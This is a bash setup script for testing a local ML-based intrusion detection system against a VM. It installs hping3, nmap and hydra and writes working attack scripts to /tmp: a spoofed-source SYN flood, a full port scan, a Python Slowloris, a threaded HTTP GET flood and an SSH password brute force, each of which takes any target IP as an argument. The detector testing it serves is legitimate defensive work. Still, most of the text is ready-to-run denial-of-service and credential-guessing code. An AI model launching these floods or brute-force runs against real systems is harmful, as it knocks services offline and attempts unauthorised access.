#!/bin/bash

cat << 'EOF'
================================================================================
 REAL ATTACK TOOLS SETUP - IDS Testing
================================================================================

This script will help you set up and use REAL attack tools that will
definitely be detected by your trained ML model.

Your model was trained on CIC-IDS2018 dataset with these attacks:
  1. DDoS/DoS attacks (LOIC, HOIC, Hulk, GoldenEye, Slowloris)
  2. Brute Force attacks (SSH, FTP, Web)
  3. SQL Injection
  4. Port scanning

================================================================================
EOF

TARGET_IP="192.168.64.3"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "⚠️  This script needs root privileges for some attacks"
    echo "   Run with: sudo ./real_attack_tools.sh"
    echo ""
fi

# Detect OS
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
    PKG_MANAGER="brew"
else
    OS="linux"
    PKG_MANAGER="apt-get"
fi

echo ""
echo "Detected OS: $OS"
echo "Target VM IP: $TARGET_IP"
echo ""

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install tool
install_tool() {
    local tool=$1
    local package=$2
    
    if command_exists "$tool"; then
        echo "✅ $tool already installed"
        return 0
    fi
    
    echo "📦 Installing $tool..."
    if [ "$OS" = "macos" ]; then
        brew install "$package" 2>/dev/null || echo "   Install with: brew install $package"
    else
        sudo apt-get install -y "$package" 2>/dev/null || echo "   Install with: sudo apt-get install $package"
    fi
}

echo "================================================================================
 STEP 1: Install Attack Tools
================================================================================
"

# Check and install tools
install_tool "hping3" "hping"
install_tool "nmap" "nmap"
install_tool "hydra" "hydra"

# Python tools
if command_exists pip3; then
    echo "📦 Installing Python attack tools..."
    pip3 install --user slowloris requests 2>/dev/null || echo "   Some Python tools may need manual installation"
fi

echo ""
echo "================================================================================
 STEP 2: Attack Scripts
================================================================================
"

# Create individual attack scripts
cat > /tmp/attack_syn_flood.sh << 'SCRIPT'
#!/bin/bash
# SYN Flood - Classic DoS attack
TARGET=${1:-192.168.64.3}
echo "🚨 Launching SYN Flood attack on $TARGET"
echo "   This will definitely be detected!"
sudo hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source $TARGET
SCRIPT

cat > /tmp/attack_port_scan.sh << 'SCRIPT'
#!/bin/bash
# Port Scan - Network reconnaissance
TARGET=${1:-192.168.64.3}
echo "🔍 Launching Port Scan on $TARGET"
nmap -sS -T4 -p- $TARGET
SCRIPT

cat > /tmp/attack_slowloris.sh << 'SCRIPT'
#!/usr/bin/env python3
# Slowloris - Slow HTTP DoS
import sys
import socket
import time
import random

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.64.3"
port = 80
sockets_count = 200

print(f"🐌 Launching Slowloris attack on {target}:{port}")
print(f"   Creating {sockets_count} slow connections...")

sockets = []

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    return s

try:
    for _ in range(sockets_count):
        try:
            s = init_socket(target)
            sockets.append(s)
        except:
            pass
    
    print(f"✅ Created {len(sockets)} connections")
    print("   Keeping connections alive (Ctrl+C to stop)...")
    
    while True:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except:
                sockets.remove(s)
                try:
                    sockets.append(init_socket(target))
                except:
                    pass
        time.sleep(15)
        print(f"   {len(sockets)} connections active...")
        
except KeyboardInterrupt:
    print("\n✋ Attack stopped")
    for s in sockets:
        try:
            s.close()
        except:
            pass
SCRIPT

cat > /tmp/attack_http_flood.sh << 'SCRIPT'
#!/usr/bin/env python3
# HTTP GET Flood - High volume requests
import requests
import threading
import time
import random
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.64.3"
url = f"http://{target}"
threads_count = 50
duration = 30  # seconds

print(f"💥 Launching HTTP GET Flood on {url}")
print(f"   {threads_count} threads for {duration} seconds")

stop_flag = False
request_count = 0

def attack():
    global request_count
    while not stop_flag:
        try:
            headers = {
                'User-Agent': f'Agent-{random.randint(1, 10000)}',
                'Accept': '*/*'
            }
            requests.get(f"{url}/?{random.randint(1, 100000)}", headers=headers, timeout=2)
            request_count += 1
        except:
            pass

try:
    print("🚀 Starting attack threads...")
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
    
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(5)
        rate = request_count / (time.time() - start_time)
        print(f"   Requests: {request_count} ({rate:.0f} req/s)")
    
    stop_flag = True
    print(f"\n✅ Attack complete: {request_count} requests sent")
    
except KeyboardInterrupt:
    stop_flag = True
    print("\n✋ Attack stopped")
SCRIPT

cat > /tmp/attack_ssh_brute.sh << 'SCRIPT'
#!/bin/bash
# SSH Brute Force
TARGET=${1:-192.168.64.3}
echo "🔐 Launching SSH Brute Force on $TARGET"
echo "   Creating password list..."

# Create simple password list
cat > /tmp/passwords.txt << PASS
admin
password
123456
root
test
PASS

if command -v hydra >/dev/null 2>&1; then
    hydra -l root -P /tmp/passwords.txt ssh://$TARGET -t 4
else
    echo "   ⚠️  hydra not installed. Install with: brew install hydra"
fi
SCRIPT

chmod +x /tmp/attack_*.sh

echo "✅ Created attack scripts in /tmp/"
echo ""

echo "================================================================================
 STEP 3: Pre-Attack Checklist
================================================================================
"

# Check if monitoring is running
if curl -s http://localhost:8000/api/monitoring/status | grep -q '"is_running":true'; then
    echo "✅ Monitoring is RUNNING"
else
    echo "❌ Monitoring is NOT RUNNING"
    echo "   Start it with: cd backend && ./auto_start_monitoring.sh"
    echo ""
fi

# Check if VM is reachable
if ping -c 1 -W 1 $TARGET >/dev/null 2>&1; then
    echo "✅ Target VM ($TARGET) is REACHABLE"
else
    echo "❌ Target VM ($TARGET) is NOT REACHABLE"
    echo "   Check: multipass list"
    echo ""
fi

# Check if web server is running on VM
if curl -s -m 2 http://$TARGET >/dev/null 2>&1; then
    echo "✅ Web server on VM is RESPONDING"
else
    echo "⚠️  Web server on VM might not be running"
    echo "   Some attacks require services to be running"
    echo ""
fi

echo ""
echo "================================================================================
 STEP 4: Launch Attacks (Choose One)
================================================================================
"

cat << 'ATTACKS'

ATTACK 1: SYN Flood (DoS) - HIGHLY DETECTABLE ⭐⭐⭐⭐⭐
   This is a classic DoS attack that floods the target with SYN packets
   Your model will DEFINITELY detect this!
   
   Run: sudo bash /tmp/attack_syn_flood.sh
   
   Expected Detection: "DoS attacks-*" with high confidence

ATTACK 2: HTTP GET Flood (DDoS) - HIGHLY DETECTABLE ⭐⭐⭐⭐⭐
   High-volume HTTP requests that overwhelm the web server
   Very similar to LOIC/HOIC attacks in training data
   
   Run: python3 /tmp/attack_http_flood.sh
   
   Expected Detection: "DDoS attacks-LOIC-HTTP" or "DoS attacks-Hulk"

ATTACK 3: Slowloris (DoS) - HIGHLY DETECTABLE ⭐⭐⭐⭐
   Slow HTTP attack that keeps connections open
   Model trained specifically on this attack type
   
   Run: python3 /tmp/attack_slowloris.sh
   
   Expected Detection: "DoS attacks-Slowloris"

ATTACK 4: Port Scan - DETECTABLE ⭐⭐⭐
   Network reconnaissance scanning all ports
   Creates distinctive traffic pattern
   
   Run: bash /tmp/attack_port_scan.sh
   
   Expected Detection: Unusual connection patterns (might be "Benign")

ATTACK 5: SSH Brute Force - HIGHLY DETECTABLE ⭐⭐⭐⭐⭐
   Rapid SSH login attempts with different passwords
   Model trained on this specific attack
   
   Run: bash /tmp/attack_ssh_brute.sh
   
   Expected Detection: "SSH-Bruteforce"

ATTACKS

echo ""
echo "================================================================================
 STEP 5: Monitoring the Attack
================================================================================
"

cat << 'MONITORING'

While the attack is running, monitor in another terminal:

Terminal 1: Watch Backend Logs
   tail -f backend/logs/*.log | grep -E "ATTACK|Prediction"

Terminal 2: Watch Statistics
   watch -n 1 "curl -s http://localhost:8000/api/stats/summary | python3 -m json.tool"

Terminal 3: Frontend Dashboard
   Open: http://localhost:5173
   You should see detections appear in real-time!

MONITORING

echo ""
echo "================================================================================
 RECOMMENDED TEST SEQUENCE
================================================================================
"

cat << 'SEQUENCE'

1. Start Monitoring (if not already running):
   cd backend && ./auto_start_monitoring.sh

2. Wait 5 seconds for system to stabilize

3. Launch HTTP GET Flood (easiest, no sudo needed):
   python3 /tmp/attack_http_flood.sh

4. Watch the frontend - you should see detections within 5-10 seconds!

5. If that works, try SYN Flood (requires sudo):
   sudo bash /tmp/attack_syn_flood.sh

6. Watch your attack count increase in the dashboard!

SEQUENCE

echo ""
echo "================================================================================
 TROUBLESHOOTING
================================================================================
"

cat << 'TROUBLE'

If no detections appear after 30 seconds:

1. Check backend logs:
   tail -50 backend/logs/app.log | grep -E "Processing|Prediction"
   
   Should see: "Processing X flows for detection"
              "Predictions: {'Benign': X, 'DoS attacks-Hulk': Y}"

2. Check if flows are being created:
   curl http://localhost:8000/api/stats/summary | grep total_flows
   
   Should increase during attack

3. If flows are created but no attacks detected:
   - Model is working but traffic might not match training patterns
   - Try a different attack type
   - SYN flood and HTTP flood have highest detection rates

4. If no flows are created:
   - Check monitoring is running
   - Check VM is reachable (ping 192.168.64.3)
   - Check backend has sudo permissions

TROUBLE

echo ""
echo "================================================================================
 READY TO TEST!
================================================================================
"

echo ""
echo "Quick Start Command:"
echo "  python3 /tmp/attack_http_flood.sh"
echo ""
echo "Then watch: http://localhost:5173"
echo ""

